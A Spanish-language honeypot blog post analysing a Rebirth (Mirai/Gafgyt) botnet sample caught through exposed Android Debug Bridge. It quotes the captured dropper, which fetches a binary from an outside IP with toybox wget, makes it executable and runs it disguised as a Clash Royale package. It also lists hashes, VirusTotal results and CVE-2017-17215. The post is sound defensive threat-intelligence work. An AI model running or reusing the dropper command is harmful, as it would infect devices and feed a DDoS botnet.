---
title: "Capturé una muestra del botnet Rebirth en mi honeypot: esto es lo que até cabos"
date: 2026-07-09
draft: false
description: "Análisis de una muestra del botnet Rebirth (variante Mirai/Gafgyt) capturada en vivo en mi honeypot T-Pot. Cadena de infección completa, proceso real de investigación con su callejón sin salida incluido, y qué dice la comunidad de seguridad sobre esta familia."
tags: ["Honeypot", "TPot", "Botnet", "Mirai", "Rebirth", "Gafgyt", "ADB", "Android", "IoT", "DDoS", "CVE-2017-17215", "MalwareAnalysis", "ThreatIntel", "BlueTeam"]
categories: ["Honeypot Diaries"]
---

{{< lead >}}
Revisando el tráfico de mi honeypot T-Pot encontré algo más interesante que el típico intento de fuerza bruta SSH: una cadena de infección completa, capturada en vivo, que resultó ser una variante del botnet **Rebirth**, de la familia Mirai/Gafgyt. Este post cuenta qué capturé exactamente, cómo até cabos para identificarlo, y qué dice la comunidad de seguridad sobre esta familia — dejando claro en cada parte qué es observación directa mía y qué es investigación de terceros.
{{< /lead >}}

---

## Lo que Capturé (esto sí es mío)

El honeypot que registró esto fue **Adbhoney**, uno de los sensores de T-Pot que simula el protocolo **ADB (Android Debug Bridge)** — el sistema de depuración remota de Android, que expuesto a internet sin autenticación es una puerta de entrada trivial para bots automatizados.

El comando ejecutado por el atacante, capturado literalmente en los logs:

```bash
toybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal
chmod 777 /data/local/tmp/com.supercell.clashroyal
./data/local/tmp/com.supercell.clashroyal adb
```

Tres pasos, típicos de un dropper automatizado:

1. **Descarga** un binario (`rebirth.arm7`) desde un servidor remoto, usando `toybox` — una utilidad tipo BusyBox preinstalada en la mayoría de sistemas Android, así el atacante no depende de tener herramientas extra en el dispositivo objetivo.
2. **Le da permisos de ejecución totales** (`chmod 777`).
3. **Lo ejecuta**, pasándole `adb` como argumento — a falta de analizar el binario en profundidad, mi lectura es que probablemente le indica usar ese vector para seguir propagándose a otros dispositivos con ADB expuesto.

El detalle que más me llamó la atención: el archivo se guarda como **`com.supercell.clashroyal`**, el nombre de paquete real del juego Clash Royale. Es una técnica sencilla de camuflaje — que alguien revisando procesos por encima no sospeche de él.

---

## Cómo Até Cabos (el proceso real, con su callejón sin salida incluido)

Lo primero que hice fue coger el hash SHA256 del archivo, que T-Pot ya había guardado automáticamente como nombre del fichero capturado:

```
849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5
```

Lo busqué en VirusTotal y **no encontré nada** — el hash no estaba en su base de datos. En ese momento no supe si era una muestra nueva sin catalogar o si simplemente estaba buscando mal. Aproveché el nombre del binario (`rebirth.arm7`, visible en el propio comando) para buscar por texto en vez de por hash, y ahí sí aparecieron referencias — un análisis de Sysdig documentando una campaña con ese mismo nombre de archivo, identificándola como parte del botnet Rebirth.

Unos días después, volví a comprobar el hash en VirusTotal y esta vez sí estaba registrado — probablemente porque otro investigador subió una copia idéntica capturada en su propio honeypot. Los comentarios de la comunidad en la ficha lo confirman: al menos dos personas más reportan haberla visto "in the wild" en fechas parecidas a la mía.

---

## Lo que Dice el Análisis Automático de VirusTotal (no es mío, lo cito)

Con la muestra ya indexada, esto es lo que refleja su ficha:

| Campo | Resultado |
|-------|-----------|
| **Detección** | 39 de 63 motores antivirus |
| **Etiqueta popular** | `trojan.mirai/smmr1` |
| **Categorías** | trojan, dropper, worm |
| **Family labels** | mirai, smmr1, camelot |
| **Arquitectura** | ELF ARM — 194.51 KB |

VirusTotal incluye también un resumen de comportamiento generado automáticamente ("Code Insights") que describe el binario como un botnet IoT de la familia Mirai/Gafgyt, con capacidad de auto-propagación explotando **CVE-2017-17215** (una RCE en routers Huawei HG532), un módulo que mata procesos de malware competidor, varios vectores de ataque DDoS, y comunicación C2 cifrada.

**No he verificado estos detalles yo mismo desensamblando el binario** — los reproduzco como lo que son: la lectura automatizada de VirusTotal, respaldada además por varias reglas YARA de la comunidad (Elastic Security, Florian Roth/Nextron Systems) que coinciden con firmas conocidas de Mirai y del exploit de CVE-2017-17215.

---

## Qué Dice la Investigación Previa sobre Rebirth (tampoco es mío)

Rebirth no parece un experimento aislado. Investigación publicada por Sysdig la describe como un servicio de **DDoS-as-a-Service** — una botnet que se alquila — presuntamente administrada bajo el alias "Docx69", promocionada en Telegram y en streams de videojuegos. Análisis técnicos anteriores la sitúan construida sobre Gafgyt, con capacidades heredadas de otras familias como QBot y STDBot.

Menciono esto como contexto de terceros, no como algo que haya confirmado por mi cuenta — pero encaja razonablemente con el comportamiento modular (propagación + DDoS + anti-competencia) que sí describe la ficha de VirusTotal para esta muestra concreta.

---

## Lo que Sí me Atrevo a Concluir Yo

- **Una vulnerabilidad de 2017 sigue siendo un vector de propagación activo en 2026.** Si el CVE-2017-17215 sigue apareciendo en malware actual, es porque sigue habiendo suficientes routers Huawei sin parchear ahí fuera como para que valga la pena seguir incluyéndolo.

- **El camuflaje como Clash Royale funciona precisamente porque nadie espera revisar procesos de un dispositivo Android a fondo.** No hace falta una técnica sofisticada de evasión si nadie está mirando.

- **Un hash sin resultados en VirusTotal no significa "nada interesante"** — a veces solo significa que llegaste antes que el resto de la comunidad. Buscar por otros datos (nombre de archivo, comando, IP) cuando el hash falla es un paso que casi se me pasa por alto.

---

## Resumen Técnico

| Campo | Fuente | Valor |
|-------|--------|-------|
| Honeypot de captura | Observación directa | Adbhoney (T-Pot) |
| Fecha de captura | Observación directa | 9 de julio de 2026 |
| Servidor de origen | Observación directa | 94.154.43.48 |
| Nombre real del archivo | Observación directa | rebirth.arm7 |
| Nombre de disfraz | Observación directa | com.supercell.clashroyal |
| SHA256 | Observación directa | `849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5` |
| Arquitectura / tamaño | VirusTotal | ELF ARM, 194.51 KB |
| Detección | VirusTotal | 39/63 |
| Familia | VirusTotal / YARA comunidad | Mirai/Gafgyt (Rebirth), smmr1 |
| CVE de propagación | VirusTotal Code Insights (no verificado por mí) | CVE-2017-17215 (Huawei HG532) |
| Contexto DDoS-as-a-Service | Investigación de Sysdig | Alias operador: "Docx69" |

---

*Este análisis combina observación directa en mi honeypot con fuentes públicas de threat intelligence (VirusTotal, investigación de Sysdig), claramente diferenciadas a lo largo del post. En ningún momento ejecuté el binario fuera del entorno aislado del honeypot.*
